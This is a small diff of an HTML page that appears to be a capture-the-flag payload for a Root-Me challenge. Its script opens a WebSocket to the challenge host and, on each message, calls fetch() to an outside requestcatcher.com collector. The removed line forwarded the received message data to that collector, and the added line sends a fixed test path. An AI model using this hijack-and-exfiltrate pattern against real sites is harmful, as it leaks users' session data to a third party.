@@ -8,6 +8,8 @@
 <body>
     
 
+    <script src="https://cdn.socket.io/4.8.1/socket.io.min.js" integrity="sha384-mkQ3/7FUtcGyoppY6bz/PORYoGqOl7/aSUMn2ymDOJcapfS6PHqxhRTMh1RR0Q6+" crossorigin="anonymous"></script>
+
     <script>
         const socket = new WebSocket('ws://ctf10.root-me.org/ws')
 
@@ -16,8 +18,9 @@
   socket.send("hello");
 };
 
+// Quand un message arrive
 socket.onmessage = (event) => {
-  fetch("https://mhyrjyj.requestcatcher.com/" + event.data)
+  fetch("https://mhyrjyj.requestcatcher.com/test500000")
 };
     </script>
 </body>
